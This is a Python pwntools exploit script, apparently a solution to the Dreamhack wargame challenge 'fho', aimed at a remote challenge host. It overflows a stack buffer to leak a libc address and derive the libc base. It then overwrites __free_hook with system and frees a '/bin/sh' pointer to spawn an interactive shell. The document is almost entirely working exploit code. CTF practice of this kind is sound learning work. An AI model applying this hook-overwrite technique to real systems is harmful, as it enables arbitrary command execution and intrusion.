
from pwn import *

r = remote("host3.dreamhack.games", 21211)
e = ELF("./fho")
libc = ELF("./libc-2.27.so")

def slog(n, m): return success(":".join([n, hex(m)]))


# [1] Leak libc base
buf = b"A" * 0x48             # maybe the 0x18 will be a RET of main??? - why not is it just 16 bytes?(0x10)
r.sendafter("Buf: ", buf)
r.recvuntil(buf)
libc_start_main_addr = u64(r.recvline()[:-1] + b"\x00"*2)
libc_base = libc_start_main_addr - (libc.symbols["__libc_start_main"]+231)
system = libc_base + libc.symbols["system"]
free_hook = libc_base + libc.symbols["__free_hook"]
binsh = libc_base + next(libc.search("/bin/sh"))

slog("libc_base", libc_base)
slog("system", system)
slog("free_hook", free_hook)
slog("/bin/sh", binsh)


# [2] Overwrite 'free_hook' -> 'system'
r.recvuntil("To write: ")
r.sendline(str(free_hook))
r.recvuntil("With: ")
r.sendline(str(system))


# [3] Exploit
r.recvuntil("To free: ")
r.sendline(str(binsh))

r.interactive()